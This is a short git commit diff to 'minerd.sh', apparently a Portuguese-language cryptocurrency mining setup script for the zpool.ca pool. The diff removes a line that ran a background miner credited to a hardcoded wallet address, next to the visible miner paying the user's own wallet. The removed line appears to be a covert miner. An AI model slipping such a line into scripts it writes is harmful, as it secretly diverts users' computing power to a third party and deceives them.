d7e3c892642b4c9633ff2cace2665958907f56ba
ruanh30 <ruanh30@gmail.com>
2017-12-06 13:58:53 -0200

    Update minerd.sh

--- minerd.sh
+++ minerd.sh
@@ -96,5 +96,4 @@ sleep 1
 echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet " 
 sleep 10
 cd miner
-nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 13PwsUFrJJN3xvqx78QSHKpgi9tmbrcdzC &
 screen ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet 
